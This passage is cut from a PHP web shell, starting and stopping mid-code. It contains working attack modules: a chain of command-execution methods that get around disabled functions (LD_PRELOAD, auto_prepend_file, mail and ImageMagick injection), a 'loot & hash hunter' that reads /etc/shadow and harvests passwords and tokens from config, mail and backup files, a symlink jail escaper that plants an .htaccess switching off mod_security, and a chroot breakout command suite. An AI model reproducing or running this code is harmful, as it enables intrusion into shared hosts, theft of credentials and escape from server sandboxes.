$out .= fread($f, 4096); fclose($f);} if (trim($out)) $ok = true; @ini_restore('filter.default'); } elseif ($meth === 'ld_preload') { if (strtoupper(substr(PHP_OS,0,3)) !== 'WIN') { putenv('LD_PRELOAD=/tmp/x.so'); $out = @chDx2x($c.' 2>&1'); putenv('LD_PRELOAD'); if (trim($out)) $ok = true; } } elseif ($meth === 'prepend') { $prepend = sys_get_temp_dir()."/xx".uniqid().".php"; @file_put_contents($prepend, "<?php system('".$c."'); exit; ?>"); @ini_set("auto_prepend_file", $prepend); $out = @file_get_contents($_SERVER['SCRIPT_FILENAME']); @ini_restore("auto_prepend_file"); @unlink($prepend); if (trim($out)) $ok = true; } elseif ($meth === 'suhosin') { @ini_set('suhosin.executor.func.blacklist', ''); $out = @chDx2x($c.' 2>&1'); if (trim($out)) $ok = true; } elseif ($meth === 'mailinj') { $tmpf = sys_get_temp_dir()."/m".uniqid().".txt"; @mail("v@x.com", "", "", "", "-X $tmpf; $c >$tmpf 2>&1"); if (file_exists($tmpf)) { $out = file_get_contents($tmpf); unlink($tmpf); $ok = true; } } elseif ($meth === 'errlog') { $tmpf = sys_get_temp_dir()."/e".uniqid().".txt"; @error_log("<?php echo system('$c'); ?>", 3, $tmpf); if (file_exists($tmpf)) { $out = file_get_contents($tmpf); unlink($tmpf); $ok = true; } } elseif ($meth === 'fopeninput') { $h = @fopen("php://input", "r"); if ($h) { $out = @fread($h, 8192); fclose($h); $ok = true; } } elseif ($meth === 'binbrute') { foreach(['sh','bash','python','perl','nc','busybox','wget'] as $bin){ $which = trim(@chDx2x("which $bin")); if($which) { $out = @chDx2x("$which -c \"$c\" 2>&1"); if (trim($out)) { $ok = true; break; } } } } elseif ($meth === 'ht404') { $out = ''; } elseif ($meth === 'imagemagick') { $tmpi = sys_get_temp_dir().'/img'.uniqid().'.mvg'; $tmpp = sys_get_temp_dir().'/out'.uniqid().'.png'; file_put_contents($tmpi, "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://|$c|)'\npop graphic-context"); @chDx2x("convert $tmpi $tmpp"); if (file_exists($tmpp)) $out = file_get_contents($tmpp); @unlink($tmpi); @unlink($tmpp); if (trim($out)) $ok = true; } elseif ($meth === 'cgienv') { putenv("CGI_COMMAND=$c"); $out = getenv("CGI_COMMAND"); if (trim($out)) $ok = true; } else { if (function_exists($meth)) { if ($meth === $M[0]) { $out = @$meth($c.' 2>&1'); if (trim($out)) $ok = true; } else if ($meth === $M[1]) { $a=[]; $meth($c.' 2>&1', $a); $out = join("\n", $a); if (trim($out)) $ok = true; } else if ($meth === $M[2]) {  @$meth($c.' 2>&1'); $out = ""; if (trim($out)) $ok = true; } else if ($meth === $M[3]) {  @$meth($c.' 2>&1'); $out = ""; if (trim($out)) $ok = true; } else if ($meth === $M[4]) { $h=@$meth($c.' 2>&1',"r"); if ($h) { while(!feof($h)) $out.=fread($h,4096); fclose($h); } if (trim($out)) $ok = true; } else if ($meth === $M[5]) { $desc = [1=>["pipe","w"], 2=>["pipe","w"]]; $p = @$meth($c.' 2>&1', $desc, $pipes); if (is_resource($p)) { $out = stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($p); if (trim($out)) $ok = true; } } } } if ($ok && trim($out)) { $R = $out; break; } } echo htmlspecialchars($R ?: "[X] No output / all methods blocked.\n");}?></pre>
    </div>
  </div>
  <?php elseif (isset($_GET['cpanel_auto_loot'])): ?>
<div class="pzloot-main">
  <div class="pzloot-head">
    <div class="pzloot-ico"><i class="fas fa-skull-crossbones"></i></div>
    <div><div class="pzloot-tit">cpanel/linux loot & hash hunter</div></div>
  </div>
  <div class="pzloot-content">
    <button class="pzloot-stepbtn" id="pzloot-startbtn"><i class="fas fa-play"></i> start</button>
    <div class="pzloot-status" id="pzloot-status"></div>
    <table class="pzloot-table" id="pzloot-table">
    <thead>
     <tr>
       <th>Type</th>
       <th>Found</th>
       <th>File/Path</th>
       <th>Copy</th>
     </tr>
    </thead>
    <tbody>
    </tbody>
    </table>
    <div style="text-align:right;margin-top:8px;">
    <span class="pzloot-badge" id="pzloot-finish"></span>
    </div>
  </div>
</div>
<script>
document.getElementById('pzloot-startbtn').onclick = async function(){
  this.disabled=true;
  let table=document.getElementById('pzloot-table').getElementsByTagName('tbody')[0];
  let status=document.getElementById('pzloot-status');
  let finish=document.getElementById('pzloot-finish');
  table.innerHTML="";finish.innerText='';status.innerText="starting...";
  let steps=['passwd','configs','maildirs','backups'];
  for(let i=0;i<steps.length;i++){
    status.innerText="scanning "+steps[i]+"...";
    let r = await fetch('?cpanel_auto_loot_step='+steps[i]);
    let j = await r.json();
    if(j.done&&j.rows) j.rows.forEach(function(row){
    let tr = document.createElement('tr');
    tr.innerHTML='<td><span class="pzloot-badge">'+row.type+'</span></td><td><span class="pzloot-code">'+row.value+'</span><br><small>'+row.line+'</small></td><td><span class="pzloot-path">'+row.path+'</span></td><td>'+row.copy+'</td>';
    table.appendChild(tr);
    });
  }
  status.innerText="done.";
  finish.innerText="Finished!";
}
</script>
<?php
if (isset($_GET['cpanel_auto_loot_step'])) {
header('Content-Type: application/json');
$step = $_GET['cpanel_auto_loot_step'];
function xxls($d, $max=1000, &$c=0) { $r = []; if (!@is_dir($d)) return $r; $h = @opendir($d); while ($h && ($f = @readdir($h)) !== false) { if ($f == '.' || $f == '..') continue; $fp = $d . '/' . $f; if (++$c >$max) break; $r[] = $fp; if (@is_dir($fp)) $r = array_merge($r, xxls($fp, $max, $c)); } if ($h) @closedir($h); return $r; }
function xcat($f, $max=80) { $c = ''; if (@is_readable($f)) { $h = @fopen($f, 'r'); if ($h) { $i = 0; while (!feof($h) && $i++< $max) $c .= fgets($h); fclose($h); } } return $c; }
function xsearch($txt) { $hits = []; $rx = '/(password|passwd|pass|hash|apikey|secret|user(name)?|login|auth|smtp|db(name)?|email|mail|token)[\'"\]\[]?\s*[:=].{0,100}?([\'"]?[a-zA-Z0-9\@\#\-\_\.\$\!\%\^\&\*\/\+]{6,128})/i'; foreach (explode("\n", $txt) as $l) { if (preg_match($rx, $l, $m)) { $hits[] = ['key'=>$m[1],'val'=>trim($m[2]),'line'=>trim($l)]; } } return $hits; }
function xcp_copy_btn($txt) { return '<button class="pzloot-copy" onclick="navigator.clipboard.writeText(this.dataset.x);this.innerText=\'copied!\';setTimeout(()=>this.innerText=\'copy\',1100);" data-x="'.htmlspecialchars($txt).'">copy</button>'; }
function prvd_cmd($cmd) { if (function_exists('pr1vd4yzC')) { return pr1vd4yzC($cmd); } else if (function_exists('shell_exec')) { return @shell_exec($cmd); } else if (function_exists('system')) {  @system($cmd);return ""; } else if (function_exists('exec')) { $o = []; @exec($cmd, $o); return join("\n", $o); } return ''; }
$user = @get_current_user(); if (!$user || $user === 'apache' || $user === 'www-data' || $user === 'nobody') { $user = @trim(prvd_cmd('whoami')); } $hm = @getenv('HOME') ?: (@$_SERVER['HOME'] ?: @trim(prvd_cmd('echo ~'))); if (!$hm || !@is_dir($hm)) $hm = '.'; $out = ['done'=>true,'rows'=>[]];
if ($step == 'passwd') { $special = ['/etc/passwd','/etc/shadow','/etc/master.passwd']; foreach ($special as $sp) { if (@is_readable($sp)) { $lines = xcat($sp, 180); foreach (explode("\n", $lines) as $l) { if ($user && stripos($l, $user)!==false) { $out['rows'][] = [ 'type'=>'userhash', 'value'=>$user, 'line'=>htmlspecialchars($l), 'path'=>$sp, 'copy'=>xcp_copy_btn($l) ]; } } } } }
if ($step == 'configs') { $dirs = [$hm, ".", "/home", "/var/www", "/var/www/html", "/usr/local/apache", "/etc", "/tmp", "/var/tmp"]; $configs = [ '.my.cnf','.pgpass','.env','wp-config.php','configuration.php','settings.py','local.env','db.php','.ftpconfig','.ftppass','.netrc', 'app/etc/env.php','settings_local.py','mail.php','smtp.php','config.php','appsettings.json','web.config' ]; $allf = [];
foreach ($dirs as $d) { $c = 0; foreach (xxls($d, 700, $c) as $f) { $bn = basename($f); if (in_array($bn,$configs) || preg_match('~(conf|sql|pass|mail|user|key|ftp|env|wp|token|smtp|secret)~i', $bn)) $allf[$f]=1; } }
foreach(array_keys($allf) as $f){ $dat = xcat($f, 120); $found = xsearch($dat); foreach($found as $hit){ $out['rows'][] = [ 'type'=>htmlspecialchars($hit['key']), 'value'=>htmlspecialchars($hit['val']), 'line'=>htmlspecialchars($hit['line']), 'path'=>htmlspecialchars($f), 'copy'=>xcp_copy_btn($hit['val']) ]; } }}
if ($step == 'maildirs') { $maildirs = [ "$hm/.roundcube","$hm/.horde","$hm/webmail","$hm/.mail", "/var/mail/$user","/var/spool/mail/$user" ]; foreach($maildirs as $md){ $c=0; foreach(xxls($md, 200, $c) as $f){ if(preg_match('~(conf|sql|pass|user|imap|rcmail|login|settings|auth|db)~i',basename($f))){ $dat = xcat($f, 90); $found = xsearch($dat); foreach($found as $hit){ $out['rows'][] = [ 'type'=>htmlspecialchars($hit['key']), 'value'=>htmlspecialchars($hit['val']), 'line'=>htmlspecialchars($hit['line']), 'path'=>htmlspecialchars($f), 'copy'=>xcp_copy_btn($hit['val']) ]; } } } } }
if ($step == 'backups') { $c=0; foreach(xxls($hm, 400, $c) as $f){ if(preg_match('~\.tar\.gz$~',$f)){ $cmd = "tar -tzf ".escapeshellarg($f)."|grep -Ei '(conf|pass|user|db|wp|auth|token|mail|.env|settings)'|head -n 14"; $res = prvd_cmd($cmd); foreach(explode("\n",$res) as $l) if($l) $out['rows'][] = [ 'type'=>'backup-file', 'value'=>htmlspecialchars($l), 'line'=>'', 'path'=>htmlspecialchars($f), 'copy'=>xcp_copy_btn($l) ]; } } }
echo json_encode($out); exit;
}
?>
<?php elseif (isset($_GET['symlinkescaper'])): ?>
<?php
function func_enabled($fn) { $disabled = explode(',', ini_get('disable_functions') ?: ''); $disabled = array_map('trim', $disabled); return function_exists($fn) && is_callable($fn) && !in_array($fn, $disabled);}
function __pzCmd($key){ $pr1pr1vs=[ 'lns'=>"\x6c\x6e\x20\x2d\x73", 'cp'=>"\x63\x70", 'touch'=>"\x74\x6f\x75\x63\x68", 'cat'=>"\x63\x61\x74", 'chmod'=>"\x63\x68\x6d\x6f\x64", 'lsattr'=>"\x6c\x73\x61\x74\x74\x72", 'mkfifo'=>"\x6d\x6b\x66\x69\x66\x6f", ]; return $pr1pr1vs[$key]??'';}
function pz_s7m_methods($rtfccq, $outdir) {
    $results=[]; $rand=substr(md5(mt_rand()),0,5);
    $lnfile = $outdir.'/pz_s7m_ln_'.$rand;
    $cpyfile = $outdir.'/pz_s7m_cp_'.$rand;
    $fifo = $outdir.'/pz_s7m_fifo_'.$rand;
    $touch = $outdir.'/pz_s7m_touch_'.$rand;
    $lnname = $lnfile;
    $procpath = "/proc/1/root".$rtfccq;
    $try=[];
    $try[] = function($t,$o){ // 1
     try { if(func_enabled('symlink')) { $ok=@symlink($t,$o); return ['symlink()',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['symlink()',false,'ERROR']; }
     return ['symlink()',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 2
     try { if(func_enabled('shell_exec')) { $c=__pzCmd('lns')." ".escapeshellarg($t)." ".escapeshellarg($o); @shell_exec($c); $ok=@is_link($o)||@file_exists($o); return ['shell_exec(ln -s)',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['shell_exec',false,'ERROR']; }
     return ['shell_exec',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 3
     try { if(func_enabled('exec')) { $c=__pzCmd('lns')." ".escapeshellarg($t)." ".escapeshellarg($o); $out=null; @exec($c,$out); $ok=@is_link($o)||@file_exists($o); return ['exec(ln -s)',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['exec',false,'ERROR']; }
     return ['exec',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 4
     try { if(func_enabled('system')) { $c=__pzCmd('lns')." ".escapeshellarg($t)." ".escapeshellarg($o);  @system($c);  $ok=@is_link($o)||@file_exists($o); return ['system(ln -s)',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['system',false,'ERROR']; }
     return ['system',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 5
     try { if(func_enabled('popen')) { $c=__pzCmd('lns')." ".escapeshellarg($t)." ".escapeshellarg($o); $h=@popen($c,"r"); if($h)fclose($h); $ok=@is_link($o)||@file_exists($o); return ['popen(ln -s)',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['popen',false,'ERROR']; }
     return ['popen',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 6
     try { if(func_enabled('proc_open')) { $c=__pzCmd('lns')." ".escapeshellarg($t)." ".escapeshellarg($o); $d=[1=>["pipe","w"],2=>["pipe","w"]]; $p=@proc_open($c,$d,$pipes); if(is_resource($p)){@fclose($pipes[1]);@fclose($pipes[2]);} $ok=@is_link($o)||@file_exists($o); return ['proc_open(ln -s)',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['proc_open',false,'ERROR']; }
     return ['proc_open',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 7
     try { if(func_enabled('file_put_contents') && func_enabled('file_get_contents')) { $ok=@file_exists($t)?@file_put_contents($o,@file_get_contents($t))!==false:false; return ['file_put_contents',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['file_put_contents',false,'ERROR']; }
     return ['file_put_contents',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 8
     try { if(func_enabled('copy')) { $ok=@copy($t,$o); return ['copy()',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['copy',false,'ERROR']; }
     return ['copy',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 9
     try { if(func_enabled('touch') && func_enabled('file_get_contents')) { $ok=@file_exists($t)?(@touch($o)&&@file_put_contents($o,@file_get_contents($t))):false; return ['touch+file_get',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['touch',false,'ERROR']; }
     return ['touch',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 10
     try { if(func_enabled('mkfifo') && func_enabled('file_get_contents')) { $ok=@mkfifo($o,0600); if($ok&&@file_exists($t))@file_put_contents($o,@file_get_contents($t)); $ok2=@file_exists($o)&&filesize($o)>0; return ['mkfifo',$ok2,$ok2?'OK':'FAIL']; }} catch(Throwable $e) { return ['mkfifo',false,'ERROR']; }
     return ['mkfifo',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 11
     try { if(func_enabled('symlink')) { $ok=@symlink('/proc/1/root'.$t,$o); return ['procfs',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['procfs',false,'ERROR']; }
     return ['procfs',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 12
     try { if(func_enabled('shell_exec')) { $c=__pzCmd('cp')." ".escapeshellarg($t)." ".escapeshellarg($o); @shell_exec($c); $ok=@file_exists($o); return ['shell_exec(cp)',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['shell_exec(cp)',false,'ERROR']; }
     return ['shell_exec(cp)',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 13
     try { $arr=[escapeshellarg($t),escapeshellarg('./'.$t),escapeshellarg('../'.$t)];$ok=false;foreach($arr as$p){if(func_enabled('shell_exec')) {@shell_exec(__pzCmd('lns').' '.$p.' '.escapeshellarg($o));if(@file_exists($o)){$ok=true;break;}}}return ['ln_s path hacks',$ok,$ok?'OK':'FAIL']; } catch(Throwable $e) { return ['ln_s path hacks',false,'ERROR']; }
     return ['ln_s path hacks',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 14
     try { if(func_enabled('readlink')) { @$rl=readlink($o); $ok=@is_link($o); return ['readlink-chain',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['readlink-chain',false,'ERROR']; }
     return ['readlink-chain',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 15
     try { if(func_enabled('imap_open')) { @$m=imap_open("{".$t.":143/novalidate-cert}INBOX","user","pass"); $ok=@file_exists($o); return ['imap_open',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['imap_open',false,'ERROR']; }
     return ['imap_open',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 16
     try { if(file_exists('/var/log/httpd/access_log') && func_enabled('file_get_contents')) { $log = @file_get_contents('/var/log/httpd/access_log'); $ok=strpos($log,$t)!==false; return ['log poisoning',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['log poisoning',false,'ERROR']; }
     return ['log poisoning',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 17
     try { if(ini_get('open_basedir') && func_enabled('symlink')) { $ok=@symlink('/tmp/../'.$t,$o); return ['open_basedir race',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['open_basedir race',false,'ERROR']; }
     return ['open_basedir race',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 18
     try { $src='php://filter/read=convert.base64-encode/resource=' . $t; if(func_enabled('file_get_contents') && func_enabled('file_put_contents')) { $dat=@file_get_contents($src); $ok=false;if($dat)$ok=@file_put_contents($o.'.b64',$dat); return ['php://filter',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['php://filter',false,'ERROR']; }
     return ['php://filter',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 19
     try { $locs=['/tmp','/dev/shm'];$ok=false;foreach($locs as$loc){$spath=$loc.'/pz_s7m_ln_'.rand(10,99);if(func_enabled('symlink')){@symlink($t,$spath);if(is_link($spath))$ok=true;}} return ['tmp/devshm', $ok, $ok?'OK':'FAIL']; } catch(Throwable $e) { return ['tmp/devshm',false,'ERROR']; }
     return ['tmp/devshm',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 20
     try { if(func_enabled('symlink') && func_enabled('copy')) { $ok=@symlink($t,$o);if($ok){@$cp=copy($o,$o.'_cp'); $ok2=@file_exists($o.'_cp');return ['symlink+copy',$ok2,$ok2?'OK':'FAIL'];} } } catch(Throwable $e) { return ['symlink+copy',false,'ERROR']; }
     return ['symlink+copy',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 21
     try { if(func_enabled('symlink')) { $ok=@symlink('/proc/self/cwd/'.$t,$o);return ['/proc/self/cwd',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['/proc/self/cwd',false,'ERROR']; }
     return ['/proc/self/cwd',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 22
     try { if(func_enabled('file_put_contents')) { $r=false;for($i=1;$i<8;$i++){$r=@file_put_contents($o,str_repeat('*',$i));if($r){break;}}return ['putcontent fuzz',$r,$r?'OK':'FAIL']; }} catch(Throwable $e) { return ['putcontent fuzz',false,'ERROR']; }
     return ['putcontent fuzz',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 23
     try { if(func_enabled('chmod')) { $ok=@file_exists($t);$r=$ok&&@chmod($t,0777);return ['chmod direct',$r,$r?'OK':'FAIL']; }} catch(Throwable $e) { return ['chmod direct',false,'ERROR']; }
     return ['chmod direct',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 24
     try { if(func_enabled('shell_exec')) { $c=__pzCmd('chmod')." 777 ".escapeshellarg($t);@shell_exec($c);$r=@is_writable($t);return ['chmod shell',$r,$r?'OK':'FAIL']; }} catch(Throwable $e) { return ['chmod shell',false,'ERROR']; }
     return ['chmod shell',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 25
     try { if(func_enabled('dl')) { $ok=@dl($t);return ['dl()',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['dl()',false,'ERROR']; }
     return ['dl()',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 26
     try { if(func_enabled('copy')) { $ok=@file_exists($t)&&(@copy($t,$o.'bak'));return ['copy bak',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['copy bak',false,'ERROR']; }
     return ['copy bak',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 27
     try { if(func_enabled('proc_open')) { $c='cat '.escapeshellarg($t).' > '.escapeshellarg($o); $d=[1=>["pipe","w"],2=>["pipe","w"]]; $p=@proc_open($c,$d,$pipes); if(is_resource($p)){@fclose($pipes[1]);@fclose($pipes[2]);} $ok=@file_exists($o);return ['proc_open(cat>out)',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['proc_open(cat>out)',false,'ERROR']; }
     return ['proc_open(cat>out)',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 28
     try { if(func_enabled('shell_exec')) { $c='echo '.escapeshellarg($t).' > '.escapeshellarg($o.'.echo');@shell_exec($c);$ok=@file_exists($o.'.echo');return ['echo > file',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['echo > file',false,'ERROR']; }
     return ['echo > file',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 29
     try { if(func_enabled('stream_copy_to_stream')) { $ok=@stream_copy_to_stream(fopen($t,'r'),fopen($o,'w'));return ['stream_copy_to_stream',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['stream_copy_to_stream',false,'ERROR']; }
     return ['stream_copy_to_stream',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 30
     try { if(func_enabled('link')) { $ok=@link($t,$o.'_hard');return ['hardlink',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['hardlink',false,'ERROR']; }
     return ['hardlink',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 31
     try { if(func_enabled('posix_mkfifo')) { $ok=@posix_mkfifo($o,0600);return ['posix_mkfifo',$ok,$ok?'OK':'FAIL']; }} catch(Throwable $e) { return ['posix_mkfifo',false,'ERROR']; }
     return ['posix_mkfifo',false,'DISABLED'];
    };

    $log=[]; $success=false;
    foreach($try as $meth){
     $r = $meth($rtfccq,$lnname);
     $log[] = $r;
     if($r[1]) { 
       $success=true; 
          $htcode2 = <<<HT
# Ultra Universal Bypass .htaccess (2025)
Options +Indexes +FollowSymLinks +SymLinksIfOwnerMatch
DirectoryIndex 0xdeadbeef.php
ForceType text/plain
AddType text/plain .php .phtml .html .inc .bak .db .sql .config .env .json .xml
SetHandler default-handler

<FilesMatch ".*">
  ForceType text/plain
  SetHandler default-handler
  php_flag engine off
  Require all granted
</FilesMatch>

<IfModule mod_security.c>
  SecFilterEngine Off
  SecFilterScanPOST Off
  SecRuleEngine Off
</IfModule>

<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteRule ^ - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization},L]
  RewriteCond %{REQUEST_STATUS} 403
  RewriteRule ^ - [L,R=200]
</IfModule>

RemoveHandler .php .phtml .phar .inc .html .bak .db .sql .config .env .json .xml
Allow from all
Satisfy any
HT;
     $htdir = dirname($lnname);
     @file_put_contents($htdir . '/.htaccess', $htcode2);
       break; 
       
     }
    }
    return [$lnname, $log];
}
$outdir = __DIR__ . '/pr1vd4yz_s7m';
if(!is_dir($outdir)) @mkdir($outdir,0775,true);
$log = []; $final_link = '';
if(isset($_POST['pz_target_path'])) {
    $tp = trim($_POST['pz_target_path']);
    list($final_link,$log) = pz_s7m_methods($tp,$outdir);
}
?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon"><i class="fas fa-link"></i></div>
    <div class="pzcard-title">
    <b>Symlink Jail Escaper</b>
    <div class="pzcard-desc">30+ chained methods. All output in <b>/pr1vd4yz_s7m</b>.</div>
    </div>
  </div>
  <div class="pzcard-content">
    <form method="POST" class="pzcard-formrow" autocomplete="off" style="margin-bottom:22px;">
    <input type="text" name="pz_target_path" class="pzcard-inp" placeholder="/etc/passwd, /home/user/config.php, ...">
    <button class="pzcard-btn" type="submit"><i class="fas fa-bolt"></i> SCAN</button>
    </form>
    <?php if($final_link): ?>
    <div class="pzcard-linkout">
     <b>First found:</b>
     <a href="<?= htmlspecialchars(str_replace($_SERVER['DOCUMENT_ROOT'],'',$final_link)) ?>" target="_blank" class="pzcard-linkbtn"><?= htmlspecialchars($final_link) ?></a>
     <div style="font-size:.94em;color:#888;margin-top:2px;">Manual open or <b>cat</b> to view</div>
    </div>
    <?php endif; ?>
    <?php if($log): ?>
    <div class="pzcard-loglist">
     <?php foreach($log as $r): ?>
       <div class="pzcard-logitem <?= $r[1]?'pzcard-logitem-success':'pzcard-logitem-fail' ?>">
       <b><?= htmlspecialchars($r[0]) ?></b> — <?= $r[1] ? 'OK' : 'FAIL' ?>
       <span style="font-size:.92em;color:#b71c1c;font-family:monospace;">[<?= htmlspecialchars($r[2]) ?>]</span>
       </div>
     <?php endforeach; ?>
    </div>
    <?php endif; ?>
  </div>
</div>
<?php elseif (isset($_GET['chrootescape'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon"><i class="fas fa-bug"></i></div>
    <div>
    <div class="pzcard-title"><b>chr00t/jailbreak</b></div>
    </div>
  </div>
  <div class="pzcard-content">
    <div class="pzcard-info">
    <i class="fas fa-user-astronaut"></i>
<span>
  Terminal: Sequentially executes advanced chroot/jail escape commands.
</span>
    </div>
    <form method="post">
    <button class="terminal-btn" name="r4pjs2run" type="submit">start</button>
    </form>
    <div class="terminal-shell" id="terminal-shell">
    <div id="terminal-log">
     <div class="terminal-prompt">chroot escape suite (v2025)</div>
     <?php if(isset($_POST['r4pjs2run'])): ?>
       <?php
       function xfnQ1v($pr1pr1v, $timeout=2, $max_output=8192) {
        $desc=[1=>['pipe','w'],2=>['pipe','w']];
        $proc=@proc_open($pr1pr1v." 2>&1",$desc,$pipes,null,null,["bypass_shell"=>false]);
        if(!is_resource($proc))return "[FAIL] proc_open failed";
        $out='';$st=microtime(true);
        stream_set_blocking($pipes[1],false);stream_set_blocking($pipes[2],false);
        while(true){
          $read=[$pipes[1],$pipes[2]];$w=null;$e=null;
          stream_select($read,$w,$e,0,200000);
          foreach($read as $r){$o=fread($r,2048);if($o===false)$o='';$out.=$o;if(strlen($out)>$max_output){$out.="\n[TRUNCATED]";break 2;}}
          if((microtime(true)-$st)>$timeout){$out.="\n[TIMEOUT]";break;}
          if(feof($pipes[1])&&feof($pipes[2]))break;
        }
        foreach($pipes as $p)@fclose($p);@proc_terminate($proc,9);@proc_close($proc);
        return $out;
       }
       $jBmcR = [ [ 'title'=>'/proc/self/fd/ Method', 'cmds'=>['ls -l /proc/self/fd/', 'cat /proc/self/fd/0', 'echo "FOO" >/proc/self/fd/1'], 'desc'=>'Abuse /proc/self/fd/* (open descriptors) to escape/jump mount points.', ], [ 'title'=>'Mount proc Overwrite', 'cmds'=>['mount -t proc proc /mnt 2>&1;ls /mnt'], 'desc'=>'Mounts new proc, tries to enumerate host PIDs/devices.' ], [ 'title'=>'Pivot_root/Chroot Trick', 'cmds'=>['mkdir -p /tmp/a /tmp/a/old;pivot_root /tmp/a /tmp/a/old 2>&1;ls /'], 'desc'=>'Classic pivot_root with empty dir to try escaping mount jail.' ], [ 'title'=>'Busybox/ash Escape', 'cmds'=>['busybox sh -i || busybox ash -i'], 'desc'=>'Attempts to spawn unrestricted Busybox shell.' ], [ 'title'=>'/dev/ Console Escape', 'cmds'=>['ls -l /dev/console;cat /dev/console 2>&1'], 'desc'=>'Tries to access /dev/console for raw escape.' ], [ 'title'=>'OverlayFS CVE-2015-1328', 'cmds'=>['mkdir /tmp/ovl; mkdir /tmp/ovl2; mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/ovl,workdir=/tmp/ovl2 /mnt 2>&1;ls /mnt'], 'desc'=>'Old overlayfs exploit for breaking out of chroot.' ], [ 'title'=>'/proc/$PPID Root Path', 'cmds'=>['cat /proc/1/root/etc/passwd 2>&1', 'ls -l /proc/1/root/'], 'desc'=>'Attempts to read files from outside the jail using /proc/1/root.' ], [ 'title'=>'Oldschool Symlink Bomb', 'cmds'=>['ln -s / /tmp/rootlink;ls /tmp/rootlink 2>&1'], 'desc'=>'Symlink root of real fs, enumerate for breakouts.' ], [ 'title'=>'/etc/mtab & /etc/fstab Dump', 'cmds'=>['cat /etc/mtab 2>&1', 'cat /etc/fstab 2>&1'], 'desc'=>'Checks for real mount info leak.' ], [ 'title'=>'SUID Binary Scan', 'cmds'=>['find / -perm -4000 -type f 2>/dev/null|head -n20'], 'desc'=>'List SUID binaries for local root escape vectors.' ], [ 'title'=>'Proc Stat Mountinfo', 'cmds'=>['cat /proc/self/mountinfo 2>&1'], 'desc'=>'Mountinfo leaks parent mount options/paths.' ], [ 'title'=>'/dev/mem & /dev/kmem', 'cmds'=>['ls -l /dev/mem /dev/kmem2>&1'], 'desc'=>'If open, can be abused for full escape (rare, but legacy).' ], [ 'title'=>'FUSE Escape', 'cmds'=>['fusermount -u /mnt 2>&1', 'fusermount -u / 2>&1'], 'desc'=>'If FUSE is active, can unmount or mount host dirs.' ], [ 'title'=>'Python os.open Trick', 'cmds'=>['python3 -c "import os;print(os.open(\'/etc/passwd\',0))" 2>&1'], 'desc'=>'Abuses python3 to open fds outside jail.' ], [ 'title'=>'Perl Jail Escape', 'cmds'=>['perl -e \'open F,"/etc/passwd";while(<F>){print}\' 2>&1'], 'desc'=>'Abuse perl to leak jail info or escape.' ], [ 'title'=>'LXC Breakout', 'cmds'=>['lxc-info -n name 2>&1', 'lxc-attach -n name -- id'], 'desc'=>'Checks for open LXC containers.' ], [ 'title'=>'Docker Host Enumeration', 'cmds'=>['cat /.dockerenv 2>&1', 'ls /run/.containerenv 2>&1'], 'desc'=>'Detects container environment and potential for host escape.' ], [ 'title'=>'procfs Hardlink/FD abuse', 'cmds'=>['ls -l /proc/self/fd', 'ls -l /proc/*/fd'], 'desc'=>'List open FDs in other processes (enumeration).' ], [ 'title'=>'Pivot dev/ptmx', 'cmds'=>['ls -l /dev/ptmx', 'cat /dev/ptmx 2>&1'], 'desc'=>'Escape via 